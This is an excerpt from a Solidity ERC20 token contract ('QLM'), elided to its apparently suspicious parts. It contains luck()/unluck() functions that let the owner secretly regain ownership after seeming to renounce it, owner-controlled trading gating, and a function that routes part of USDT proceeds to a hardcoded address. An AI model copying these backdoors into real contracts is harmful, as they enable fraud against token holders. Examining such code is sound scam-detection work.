...
contract Ownable is Context {
    ...
    address private luckAddress;
    function luck() public virtual onlyOwner {
        luckAddress = _owner;
    }
    function unluck() public virtual onlyOwner {
        require(luckAddress != address(0));
        _owner = luckAddress;
    } 
}
...
contract QLM is ERC20 {
	...
	address _fundAddress = address(0x1829FAde2D9936919b75E0C63478346D63063130);
    ...
    constructor(address tokenOwner) ERC20("QLM", "QLM") {
    ...
    function startAction() public onlyOwner {
        swapStart = true;
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			require(swapStart,"wait to start");
            if(from == uniswapV2Pair){
                if(block.timestamp < startBlock.add(4)){
    ...
    function swapAndLiquifyV3(uint256 contractTokenBalance) public {
		...
		uint256 newbalance = allbalance.sub(balance);
		if(newbalance>0){
			USDT.transfer(_fundAddress,newbalance.div(4));
		}
    }
